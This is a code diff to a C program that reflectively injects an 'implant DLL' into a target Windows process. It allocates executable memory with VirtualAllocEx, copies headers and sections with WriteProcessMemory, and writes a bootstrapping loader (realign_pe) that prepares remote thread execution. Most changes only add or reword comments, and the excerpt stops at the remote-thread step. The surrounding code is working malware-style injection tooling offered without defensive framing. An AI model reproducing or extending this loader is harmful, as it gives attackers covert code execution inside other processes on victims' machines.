@@ -245,6 +245,8 @@ int main(int argc, char **argv) {
      * *********************/
     dll_info.base_relocation_required = FALSE;
 
+    // Allocating memory in the target process with the size equal to the DLL's image size.
+    // This space is reserved for the entire content of the DLL including headers, sections, and other data.
     if ((target_base_addr = VirtualAllocEx(target_process_handle, (LPVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
         dll_info.base_relocation_required = TRUE;
 
@@ -257,13 +259,16 @@ int main(int argc, char **argv) {
     /***********************
      * Copy in headers
      * *********************/
-
+    // Writing the PE headers of the DLL into the allocated memory in the target process.
+    // This includes the DOS header, NT headers, and optional headers which define the structure and execution information of the PE file.
     WriteProcessMemory(target_process_handle, target_base_addr, local_dll_base, nt->OptionalHeader.SizeOfHeaders, NULL);
 
     /***********************
      * Copy in sections
      * *********************/
 
+    // Iterating through the sections of the PE (like .text, .data, .rdata) and writing them to the allocated memory.
+    // Each section is copied to its respective virtual address offset within the allocated space.
     printf("Number of sections in implant DLL: %d\n", nt->FileHeader.NumberOfSections);
     for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         printf("Copying section into process memory: %s, size: %d\n", section->Name, section->SizeOfRawData);
@@ -276,8 +281,8 @@ int main(int argc, char **argv) {
     dll_info.get_process_addr = GetProcAddress;
     dll_info.load_library_a_addr = LoadLibraryA;
 
-    // Allocate memory in the virtual address space of the target process.
-    // The size of the memory allocated is func_size + sizeof(dll_info).
+    // Allocating memory in the target process for the bootstrapping code.
+    // This memory will host the custom code responsible for properly loading and aligning the DLL in the process's memory.
     injected_memory_base = VirtualAllocEx(target_process_handle, NULL, func_size + sizeof(dll_info), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if(injected_memory_base == NULL) {
         printf("[-] Failed to allocate memory for PE.\n");
@@ -285,9 +290,12 @@ int main(int argc, char **argv) {
         return EXIT_FAILURE;
     }
 
-    // write the dll_info structure to the beginning of the allocated memory (injected_memory_base)
+    // Writing the DLL_INFO structure to the beginning of the allocated bootstrapping memory.
+    // This structure contains crucial information like base addresses and function pointers needed by the bootstrapping code.
     WriteProcessMemory(target_process_handle, injected_memory_base, &dll_info, sizeof(dll_info), NULL);
-    // writes a code segment (realign_pe) into the memory. 
+
+    // Writing the bootstrapping code (realign_pe function) immediately after the DLL_INFO structure in the allocated memory.
+    // This code will perform tasks like base relocation and import address table resolution.
     WriteProcessMemory(target_process_handle, injected_memory_base + sizeof(dll_info), realign_pe, func_size, NULL);
 
     // create a thread in the target process, the thread starts executing at the memory location where realign_pe was written 
